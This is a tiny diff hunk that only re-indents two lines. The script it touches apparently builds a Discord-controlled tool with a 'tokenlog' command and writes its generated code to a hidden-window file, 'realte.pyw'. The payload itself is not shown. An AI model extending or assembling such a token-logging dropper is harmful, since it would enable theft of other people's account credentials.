@@ -304,5 +304,5 @@ async def tokenlog(ctx):
 godseye.run(DiscordBotToken)
 """)))
 f = open("realte.pyw", "x")
-    f.write(mainstr)
-    f.close()
+f.write(mainstr)
+f.close()
